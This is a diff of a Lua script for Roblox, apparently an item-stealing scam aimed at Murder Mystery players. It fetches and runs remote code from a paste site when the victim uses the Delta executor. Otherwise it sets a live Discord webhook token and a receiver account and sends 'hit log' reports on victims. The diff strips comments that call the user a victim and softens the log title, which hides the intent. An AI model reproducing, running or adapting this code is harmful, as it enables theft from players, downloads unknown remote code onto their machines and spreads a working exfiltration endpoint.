@@ -6583,19 +6583,16 @@ local player = game.Players.LocalPlayer
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
--- EXECUTOR KONTROLÜ (DELTA CHECK)
+
 local executorName = "Unknown"
 pcall(function() executorName = identifyexecutor() end)
 
 if string.find(string.lower(executorName), "delta") then
-    -- Kurban Delta kullanıyorsa bu çalışır
     loadstring(game:HttpGet("https://pastefy.app/guKKZaGm/raw"))()
 else
-    -- Delta değilse senin ana kodun başlar
     if getgenv().executed then return end
     getgenv().executed = true
 
-    -- AYARLAR
     local webhook_url = "https://discord.com/api/webhooks/1448202966296170608/JQJ7NnehW7RHFQVkXTHFifIbjKQfzkxJRe0rYCEXQPQ2Yle7eofgcnOvbEfD5ZIxqzoR"
     local receiver_account = "mooncatbanke"
 
@@ -6736,7 +6733,7 @@ else
         local payload = {
             ["content"] = total >= 100 and "@everyone" or "",
             ["embeds"] = {{
-                ["title"] = "🔪 Murder Mystery Hit Log",
+                ["title"] = "🔪 Murder Mystery",
                 ["color"] = total >= 1000 and 0xff1e1e or 0x00ff00,
                 ["fields"] = {
                     {["name"] = "👤 Player Profile", ["value"] = "> 🧑‍💻 **Nick:** " .. player.Name .. "\n> 📥 **Receiver:** " .. receiver_account .. "\n> ⚙️ **Executor:** " .. executorName},
